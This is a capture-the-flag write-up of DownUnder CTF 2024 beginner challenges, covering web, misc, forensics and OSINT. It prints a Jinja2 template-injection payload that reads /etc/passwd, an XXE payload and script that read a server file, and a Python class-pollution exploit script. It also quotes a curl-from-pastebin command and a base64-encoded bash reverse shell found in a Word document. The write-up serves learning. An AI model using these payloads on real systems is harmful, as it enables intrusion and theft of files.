# DownUnder CTF 2024

i was part of the team "0xB8000" in this competition.

official github containing the source code of the challenges and the official writeups:

https://github.com/DownUnderCTF/Challenges_2024_Public

## tldr please summarise

category: beginner, misc

"I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?"

there was a word document attached. since i remembered a word document can be unzipped, i did just that with

```bash
unzip "EmuWar.docx"
```

to see all the file contents of the unzipped archive i executed

```bash
find . -type f -exec cat {} \;
```

in `word/document.xml` i found the following curl command:

```bash
curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d
```

which revealed the flag.

the pastebin's content was the base64 encoded string `YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=`

## parrot the emu

category: beginner, web

"It is so nice to hear Parrot the Emu talk back"

a short look into the given source code revealed this is a web app powered by flask.

the `index.html` screamed template injection right away, since the message you put into the form is displayed unsanitized.

a quick google search for "flask template injection" found me this helpful link:

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

then i created a test payload with

`{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}` 

which showed me the contents of the passwd file and

`{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag').read()}}` 

showed the flag file's content.

## zoo feedback form

category: beginner, web

"The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!"

when you look at the source code of the app, the `submitFeedback()` method in `index.html` looked promising; it posts a string (which needs to be valid XML) to the app at the endpoint `/`

in `app.py` you see the flask route which handles this POST request. in each case, we need the POST parameter "feedback" present in a valid XML, otherwise we get an error.

the regular use of the API would e.g. render the word "test" with a feedback post parameter value like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root><feedback>test</feedback></root>
```

since the "feedback" parameter is otherwise not sanitized, this looked like template injection with a different spin. 

after a quick google search for xml vulnerabilities with python's `etree.XMLParser` class (as seen in `app.py`), i found this link: 

https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870

the vulnerability (apart from allowing the user to POST unsanitized XML) is that the XMLParser is allowed to include entities with `resolve_entities=True`.

after a bit of fiddling around with the potential payloads from the link above, this was the final value of the feedback parameter which i used to get the flag:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE feedback [ <!ELEMENT feedback ANY > 
<!ENTITY xxe SYSTEM "file:////app/flag.txt" >]>
<root><feedback>&xxe;</feedback></root>
```

or in a script:

```python
import requests

# adjust with your host
host = "web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev"
port = 443

to_post = ('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE feedback '
           '[ <!ELEMENT feedback ANY > <!ENTITY xxe SYSTEM "file:////app/flag.txt" >]><root><feedback>&xxe;</feedback></root>')

headers = {
    "Content-Type": "application/xml"
    }

x = requests.post(f"https://{host}:{port}/", data=to_post, headers=headers)

response = x.text

print(response)
```

## co2

category: web, easy

"A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application."

after i sifted through the source code, this comment in `routes.py` looked promising:

```
# Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
```

ok, let's look at the `merge()` method in `utils.py`, which is called right after this sketchy comment.
hmm, i have seen that before... i did not remember the name of this kind of vulnerability though, but with a google search `__getitem__ python vulnerability` i found out again it is called "prototype pollution". one can set e.g. variables or in some cases even call other programs with this kind of vulnerability, depending on the circumstances.

these links helped me a lot to craft the final payload: 

https://blog.abdulrah33m.com/prototype-pollution-in-python/

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution

since in `routes.py` there is a global variable in the module which allows us to read the flag, that was the "gotcha":

```python
@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

before you could actually call the `save_feedback` endpoint, i had to register and login first, as seen below.

the solution in a script:

```python
import json
import requests

# host of spawned instance, replace with the hostname you need
host = "web-co2-341ba22f64f2d763.2024.ductf.dev"
port = 443

# first we need to register to the site, e.g. with username test1234 and password test1234
with requests.Session() as s:
    payload = {
        'username': 'test1234',
        'password': 'test1234'
    }
    p = s.post(f"https://{host}:{port}/register", data=payload)

# now we need to login with that user and password
with requests.Session() as s:
    payload = {
        'username': 'test1234',
        'password': 'test1234'
    }
    p = s.post(f"https://{host}:{port}/login", data=payload)

    # this is a "regular POST body" as it is used in a normal case inside the app; we do not want to use it like that though...
    '''
    json_body = {
                "title": "title",
                "content": "content",
                "rating": "rating",
                "referred": "referred"
    }
    '''
    #  we want to set the global var "flag" to true
    json_body = json.loads(
        '{"__init__":{"__globals__":{"flag":"true"}}}')

    headers = {
        "Content-Type": "application/json"
        }

    s.post(f"https://{host}:{port}/save_feedback", json=json_body, headers=headers)

    x = s.get(f"https://{host}:{port}/get_flag")

    response = x.text

    print(response)
```

## Baby's First Forensics

category: forensics, beginner

"They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?"

after opening the capture file in wireshark and looking through the "Endpoints" and "Conversations" view, I could see quite quickly that the attacker spamming all the TCP traffic had to be the machine with the IP "172.16.17.131". furthermore, most of the application protocols used was http.

with a filter `http and ip.src_host == 172.16.17.131` one of the first requests showed "nikto 2.1.6" as one of the HTTP headers, which yielded the flag.

## offtheramp

category: osint, beginner

"That looks like a pretty cool place to escape by boat, EXAMINE the image and discover the name of this structure."

the given jpeg yielded the following interesting metadata entry after running `exiftool offtheramp.jpeg`:

`38 deg 9' 15.95" S, 145 deg 6' 29.69" E`

which are coordinates which just had to be converted to

`38°09'15.6"S 145°06'29.7"E`

so that google maps could understand them.

this showed a view from a hill right on to a place called "Olivers Hill Boat Ramp" in google maps.



